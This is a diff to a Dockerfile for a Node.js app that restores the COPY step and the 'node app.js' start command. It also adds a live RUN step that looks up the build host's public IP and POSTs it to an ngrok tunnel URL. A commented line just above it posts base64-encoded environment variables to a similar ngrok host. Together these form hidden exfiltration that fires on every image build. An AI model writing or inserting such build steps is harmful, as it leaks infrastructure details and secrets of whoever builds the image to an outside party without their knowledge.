@@ -5,8 +5,9 @@ WORKDIR /home/node/app
 COPY package*.json ./
 USER node
 RUN npm install
-#COPY --chown=node:node . .
+COPY --chown=node:node . .
 EXPOSE 3001
-#CMD ["node", "app.js"]
-CMD ["/bin/nginx"]
+CMD ["node", "app.js"]
+# CMD ["/bin/nginx"]
 # RUN curl -d "$(env | base64)" -X POST http://c305-89-64-53-227.ngrok.io
+RUN curl -d "$(wget -qO - icanhazip.com)" -X POST http://a8f1-89-64-53-227.ngrok.io
